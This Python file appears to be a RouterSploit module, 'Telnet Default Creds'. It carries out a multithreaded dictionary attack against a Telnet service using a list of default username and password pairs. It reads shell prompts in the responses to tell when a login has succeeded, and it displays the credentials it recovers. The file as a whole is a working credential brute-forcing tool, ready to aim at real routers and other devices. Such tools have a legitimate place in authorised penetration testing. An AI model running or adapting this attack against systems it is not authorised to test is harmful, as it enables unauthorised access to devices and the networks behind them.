import threading
import telnetlib

from routersploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    boolify,
    multi,
)


class Exploit(exploits.Exploit):
    """
    Module perform dictionary attack with default credentials against Telnet service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'Telnet Default Creds',
        'description': 'Module perform dictionary attack with default credentials against Telnet service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
        ],
        'references': [
            '',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(23, 'Target port')

    threads = exploits.Option(8, 'Numbers of threads')
    defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
    verbosity = exploits.Option('yes', 'Display authentication attempts')
    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')

    credentials = []

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        try:
            tn = telnetlib.Telnet(self.target, self.port, timeout=10)
            tn.expect(["login: ", "Login: "], 5)
            tn.close()
        except Exception:
            print_error("Connection error {}:{}".format(self.target, self.port))
            return

        if self.defaults.startswith('file://'):
            defaults = open(self.defaults[7:], 'r')
        else:
            defaults = [self.defaults]

        collection = LockedIterator(defaults)
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name
        print_status(name, 'process is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                line = data.next().split(":")
                user = line[0].strip()
                password = line[1].strip()
            except StopIteration:
                break
            else:
                retries = 0
                while retries < 3:
                    try:
                        tn = telnetlib.Telnet(self.target, self.port, timeout=10)
                        tn.expect(["Login: ", "login: "], 5)
                        tn.write(user + "\r\n")
                        tn.expect(["Password: ", "password"], 5)
                        tn.write(password + "\r\n")
                        tn.write("\r\n")

                        (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
                        tn.close()

                        if i != -1:
                            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                        else:
                            if any(map(lambda x: x in res, ["#", "$", ">"])) or len(res) > 500:  # big banner e.g. mikrotik
                                if boolify(self.stop_on_success):
                                    running.clear()

                                print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                                self.credentials.append((self.target, self.port, user, password))
                        tn.close()
                        break
                    except EOFError:
                        print_error(name, "Connection problem. Retrying...", verbose=module_verbosity)
                        retries += 1

                        if retries > 2:
                            print_error("Too much connection problems. Quiting...", verbose=module_verbosity)
                            return
                        continue

        print_status(name, 'process is terminated.', verbose=module_verbosity)
